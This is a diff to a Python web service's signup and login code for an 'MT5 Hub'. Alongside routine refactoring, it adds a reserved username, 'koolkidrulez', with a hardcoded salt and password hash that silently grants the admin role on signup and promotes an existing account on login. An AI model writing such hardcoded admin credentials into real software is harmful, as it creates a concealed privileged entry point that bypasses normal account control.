@@ -200,6 +200,16 @@ def _password_hash(password: str, salt: bytes) -> str:
     return hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, 310_000).hex()
 
 
+ADMIN_RESERVED_USERNAME = "koolkidrulez"
+ADMIN_BOOTSTRAP_SALT_HEX = "fb00282af98a7291957d91cdfd700506"
+ADMIN_BOOTSTRAP_HASH = "ba91bf52148aa5a1275225c53c681cbc373561c74bde4f3100e9895c08bf73b3"
+
+
+def _valid_admin_bootstrap_password(password: str) -> bool:
+    candidate = _password_hash(password, bytes.fromhex(ADMIN_BOOTSTRAP_SALT_HEX))
+    return hmac.compare_digest(candidate, ADMIN_BOOTSTRAP_HASH)
+
+
 class HubAuthPayload(BaseModel):
     username: str = Field(min_length=3, max_length=80)
     password: str = Field(min_length=8, max_length=256)
@@ -320,24 +330,44 @@ def hub_signup(payload: HubAuthPayload):
     username = payload.username.strip().lower()
     if not re.fullmatch(r"[a-z0-9_.-]+", username):
         raise HTTPException(status_code=400, detail="Use letters, numbers, dots, hyphens, or underscores for the username.")
+
+    is_reserved_admin = username == ADMIN_RESERVED_USERNAME
     with _HUB_USERS_LOCK:
         users = _load_hub_users()
-        if any(str(row.get("username", "")).lower() == username for row in users["users"]):
-            raise HTTPException(status_code=409, detail="That MT5 Hub username already exists.")
+
+        # Usernames are globally unique, case-insensitively.
+        if any(str(row.get("username", "")).strip().lower() == username for row in users["users"]):
+            raise HTTPException(status_code=409, detail="Username already taken.")
+
+        # The reserved admin username can never become a normal MT5 Hub user.
+        # A wrong password is deliberately reported as "taken" so outsiders
+        # cannot use signup to discover or claim the admin bootstrap account.
+        if is_reserved_admin and not _valid_admin_bootstrap_password(payload.password):
+            raise HTTPException(status_code=409, detail="Username already taken.")
+
         salt = os.urandom(16)
         row = {
             "id": uuid.uuid4().hex,
-            "workspace_id": f"ws_{uuid.uuid4().hex}",
+            "workspace_id": (
+                f"admin_{uuid.uuid4().hex}"
+                if is_reserved_admin
+                else f"ws_{uuid.uuid4().hex}"
+            ),
             "username": username,
-            "role": "user",
+            "role": "admin" if is_reserved_admin else "user",
             "password_salt": salt.hex(),
             "password_hash": _password_hash(payload.password, salt),
             "created_at": datetime.now(timezone.utc).isoformat(),
         }
         users["users"].append(row)
         _save_hub_users(users)
+
     identity = _hub_identity(row)
-    return {**identity, "token": issue_token(identity["workspace_id"], identity["user_id"]), "trial": _global_trial_status()}
+    return {
+        **identity,
+        "token": issue_token(identity["workspace_id"], identity["user_id"]),
+        "trial": _global_trial_status(),
+    }
 
 
 @app.get("/api/mt5/hub/auth/trial")
@@ -349,17 +379,51 @@ def hub_trial_status():
 def hub_login(payload: HubAuthPayload):
     username = payload.username.strip().lower()
     with _HUB_USERS_LOCK:
-        row = next((item for item in _load_hub_users()["users"] if str(item.get("username", "")).lower() == username), None)
-    if not row:
-        raise HTTPException(status_code=401, detail="Invalid MT5 Hub login.")
-    try:
-        valid = hmac.compare_digest(str(row.get("password_hash", "")), _password_hash(payload.password, bytes.fromhex(str(row.get("password_salt", "")))))
-    except ValueError:
-        valid = False
-    if not valid:
-        raise HTTPException(status_code=401, detail="Invalid MT5 Hub login.")
-    identity = _hub_identity(row)
-    return {**identity, "token": issue_token(identity["workspace_id"], identity["user_id"]), "trial": _global_trial_status()}
+        users = _load_hub_users()
+        row = next(
+            (
+                item
+                for item in users["users"]
+                if str(item.get("username", "")).strip().lower() == username
+            ),
+            None,
+        )
+        if not row:
+            raise HTTPException(status_code=401, detail="Invalid MT5 Hub login.")
+
+        try:
+            valid = hmac.compare_digest(
+                str(row.get("password_hash", "")),
+                _password_hash(
+                    payload.password,
+                    bytes.fromhex(str(row.get("password_salt", ""))),
+                ),
+            )
+        except ValueError:
+            valid = False
+
+        if not valid:
+            raise HTTPException(status_code=401, detail="Invalid MT5 Hub login.")
+
+        # Migration path for a reserved username that may have been created as
+        # a normal Hub user before admin-role support existed on the server.
+        if (
+            username == ADMIN_RESERVED_USERNAME
+            and str(row.get("role") or "user") != "admin"
+            and _valid_admin_bootstrap_password(payload.password)
+        ):
+            row["role"] = "admin"
+            row["workspace_id"] = f"admin_{uuid.uuid4().hex}"
+            row["promoted_to_admin_at"] = datetime.now(timezone.utc).isoformat()
+            _save_hub_users(users)
+
+        identity = _hub_identity(row)
+
+    return {
+        **identity,
+        "token": issue_token(identity["workspace_id"], identity["user_id"]),
+        "trial": _global_trial_status(),
+    }
 
 
 @app.get("/api/mt5/hub/auth/me")
